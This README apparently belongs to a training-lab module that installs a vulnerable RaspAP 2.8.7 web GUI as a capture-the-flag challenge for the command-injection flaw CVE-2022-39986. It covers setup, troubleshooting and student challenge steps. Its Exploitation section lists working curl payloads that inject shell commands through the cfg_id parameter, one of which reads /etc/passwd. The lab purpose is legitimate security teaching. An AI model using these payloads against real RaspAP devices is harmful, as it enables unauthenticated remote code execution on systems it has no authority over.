# RaspAP CVE-2022-39986 Module

## Overview

This module implements CVE-2022-39986, a critical command injection vulnerability in RaspAP Web GUI versions 2.8.0 through 2.8.7.

## Vulnerability Details

| Attribute | Value |
|-----------|-------|
| **CVE ID** | CVE-2022-39986 |
| **CVSS Score** | 9.8 (Critical) |
| **Affected Versions** | RaspAP 2.8.0 - 2.8.7 |
| **Attack Vector** | Unauthenticated HTTP request |
| **Impact** | Remote Code Execution |

## Installation

The module installs:
- RaspAP 2.8.7 (vulnerable version)
- lighttpd web server
- PHP 8.2 with CGI
- Required PHP extensions

All dependencies are available in Debian 12 standard repositories.

### Required File

**Important:** The RaspAP tarball must be downloaded separately and placed in the `files/` directory:

```bash
# Download RaspAP 2.8.7 (vulnerable version)
cd modules/vulnerabilities/unix/http/raspap_cmd_injection/files/
wget https://github.com/billz/raspap-webgui/archive/refs/tags/v2.8.7.tar.gz -O raspap-webgui-2.8.7.tar.gz
```

Expected file size: ~3-5 MB

## Exploitation

### Vulnerable Endpoint

```
POST /ajax/openvpn/del_ovpncfg.php
Parameter: cfg_id
```

### Example Payloads

```bash
# Execute whoami
curl -X POST http://target:PORT/ajax/openvpn/del_ovpncfg.php \
  -d "cfg_id=config.ovpn;whoami;#"

# Read /etc/passwd
curl -X POST http://target:PORT/ajax/openvpn/del_ovpncfg.php \
  -d "cfg_id=config.ovpn;cat /etc/passwd;#"

# List files
curl -X POST http://target:PORT/ajax/openvpn/del_ovpncfg.php \
  -d "cfg_id=config.ovpn;ls -la /var/www;#"
```

## CTF Challenge Structure

1. Students discover the RaspAP web interface
2. Pre-leaked page hints at OpenVPN configuration management
3. Students discover the command injection vulnerability
4. Students exploit to find leaked flag files

## Troubleshooting

### Service won't start

```bash
systemctl status lighttpd
journalctl -u lighttpd -n 50
tail -f /var/log/lighttpd/error.log
```

### Permission issues

```bash
chown -R www-data:www-data /var/www/raspap
chmod 755 /var/www/raspap
```

### PHP not executing

```bash
# Ensure fastcgi is enabled
lighttpd-enable-mod fastcgi
lighttpd-enable-mod fastcgi-php

# Restart service
systemctl restart lighttpd
```

## References

- [NVD - CVE-2022-39986](https://nvd.nist.gov/vuln/detail/CVE-2022-39986)
- [GitHub Advisory](https://github.com/advisories/GHSA-7c28-wg7r-pg6f)
- [PoC Repository](https://github.com/tucommenceapousser/RaspAP-CVE-2022-39986-PoC)
- [RaspAP Project](https://github.com/billz/raspap-webgui/)
